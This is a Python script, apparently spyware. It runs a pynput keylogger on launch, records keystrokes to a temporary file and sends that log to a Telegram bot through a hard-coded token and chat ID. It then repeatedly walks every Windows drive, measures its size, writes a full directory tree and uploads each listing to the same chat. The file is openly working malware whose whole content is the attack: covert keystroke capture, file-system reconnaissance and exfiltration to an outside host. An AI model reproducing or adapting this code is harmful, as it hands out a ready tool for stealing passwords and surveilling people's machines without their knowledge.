#lang:python
#requirements: requests pynput

import os
import time
import string
import requests
import tempfile
import logging
import threading
from pynput.keyboard import Key, Listener

chat_id = "-4102145810"
token = "6653447632:AAEHVkyZH-TFa9141etCM1wmPyJ9rCXuASA"

def send_message(chat_id, token, message):
    r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}")

def send_file(chat_id, token, filepath):
    data = {'chat_id' : chat_id}
    with open(filepath, 'rb') as file:
        files = {
            'document': file.read()
        }
    r = requests.post(f"https://api.telegram.org/bot{token}/sendDocument", data=data, files=files)

def is_junction(path):
    if os.path.isdir(path) and not os.path.exists(path):
        return True
    return False

def tree(directory, file, prefix=''):
    try:
        files = os.listdir(directory)
    except PermissionError:
        return

    files.sort()
    contents = [(f, os.path.isdir(os.path.join(directory, f))) for f in files]

    for index, (name, is_dir) in enumerate(contents):
        path = os.path.join(directory, name)
        
        if is_junction(path):
            continue
        
        if is_dir:
            connector = '├── ' if index < len(contents) - 1 else '└── '
            file.write(prefix + connector + name + '/\n')
            extension = '│   ' if index < len(contents) - 1 else '    '
            tree(path, file, prefix + extension)
        else:
            connector = '├── ' if index < len(contents) - 1 else '└── '
            file.write(prefix + connector + name + '\n')

def process_path(chat_id, token, disk):
    with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
        tree(disk, temp_file)
        temp_file_path = temp_file.name
    return disk, temp_file_path

def scan_disks(parameter, interval):
    maj_letters = list(string.ascii_uppercase)
    while True:
        disks = []
        for maj_letter in maj_letters:
            letterpath = f"{maj_letter}:\\"
            if os.path.isdir(letterpath):
                if parameter == 1:
                    disks.append(letterpath)
                elif parameter == 2:
                    if not (os.path.isdir(letterpath + "Windows\\system32") or os.path.isdir("/usr/bin")):
                        disks.append(letterpath)
        yield disks
        time.sleep(interval)

def get_folder_size(folder_path):
    total_size = 0
    try:
        for entry in os.scandir(folder_path):
            try:
                if entry.is_file(follow_symlinks=False):
                    total_size += entry.stat(follow_symlinks=False).st_size
                elif entry.is_dir(follow_symlinks=False):
                    total_size += get_folder_size(entry.path)
            except (PermissionError, FileNotFoundError, OSError) as e:
                print(f"Unable to access to {entry.path}: {e}")
                continue
    except (PermissionError, FileNotFoundError, OSError) as e:
        print(f"Unable to access to {folder_path}: {e}")
        pass
    return total_size

def format_size(size_bytes):
    if size_bytes == 0:
        return "0"
    size_gb = size_bytes / (1024 ** 3)
    return f"{size_gb:.2f}"

def keylogger(file, timeout):
    logging.basicConfig(filename=file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    stop_listener = threading.Event()

    def on_press(key):
        logging.info(str(key))

    def stop_after_delay():
        stop_listener.wait(timeout)
        stop_listener.set()
        listener.stop()

    timer_thread = threading.Thread(target=stop_after_delay)
    timer_thread.start()

    with Listener(on_press=on_press) as listener:
        stop_listener.wait()
        listener.stop()

    timer_thread.join()

def is_file_empty(file_path):
    return os.path.getsize(file_path) == 0

send_message(chat_id, token, "Starting")

temp_file = tempfile.NamedTemporaryFile(delete=False)
log_file_path = temp_file.name
temp_file.close()

send_message(chat_id, token, f"Temp file : {str(log_file_path)}")

if os.path.isfile(log_file_path):
    os.remove(log_file_path)
keylogger(log_file_path, 10)

send_message(chat_id, token, "keylogger() end")

if not is_file_empty(log_file_path):
    send_message(chat_id, token, "sending file")
    send_file(chat_id, token, log_file_path)
    send_message(chat_id, token, "done")

#Param 1 : for all disks
#Param 2 : for no OS disks

for disks in scan_disks(1, 10):
    for disks in disks:
        #Calcul disk size
        total_size = get_folder_size(str(disks))
        total_size = format_size(total_size)
        #Send infos
        send_message(chat_id, token, disks + " : " + total_size + " go")
        #Print infos
        print(f"Starting tree : {disks}, total size : {str(total_size)} go")
        #Start timer
        start_time = time.time()
        #Tree
        disk, temp_file_path = process_path(chat_id, token, disks)
        #Stop timer
        end_time = time.time()
        #Send file
        send_file(chat_id, token, temp_file_path)
        #Calcul time to make action
        elapsed_time = end_time - start_time
        #Send
        send_message(chat_id, token, "Done in : " + str(elapsed_time) + " seconds")
        #Print infos
        print(f"Done in {str(elapsed_time)} seconds")